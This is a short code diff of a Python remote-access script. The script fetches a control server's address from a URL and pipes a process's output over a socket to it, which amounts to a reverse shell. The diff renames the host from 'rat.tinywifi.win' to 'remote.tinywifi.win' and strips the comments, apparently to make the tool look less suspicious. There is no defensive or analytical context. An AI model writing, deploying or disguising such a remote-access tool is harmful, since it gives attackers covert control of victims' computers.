@@ -11,10 +11,9 @@ def p2s(s, p):
     while True:
         s.send(p.stdout.read(1))
 
-# --- Fetch IP and port from the remote file ---
 def get_target():
     try:
-        url = "http://rat.tinywifi.win/tcp.txt"
+        url = "http://remote.tinywifi.win/tcp.txt"
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
         raw = urllib.request.urlopen(req, timeout=10).read().decode().strip()
         raw = raw.replace("tcp://", "")
@@ -24,7 +23,6 @@ def get_target():
         raise SystemExit(f"[!] Failed to fetch target: {e}")
 
 
-# --- Main connection logic ---
 host, port = get_target()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
